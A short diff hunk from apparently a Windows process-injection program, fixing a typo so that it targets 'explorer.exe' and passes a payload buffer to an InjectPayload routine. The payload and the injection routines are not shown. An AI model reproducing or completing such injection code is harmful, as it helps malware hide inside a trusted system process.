@@ -78,7 +78,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	HANDLE hProcess = NULL;
 	unsigned int payloadSize = sizeof(payload);
 
-	hProcess = FindTargetProcess("explorer,exe");
+	hProcess = FindTargetProcess("explorer.exe");
 
 	if (hProcess != NULL) {
 		InjectPayload(hProcess, payload, payloadSize);
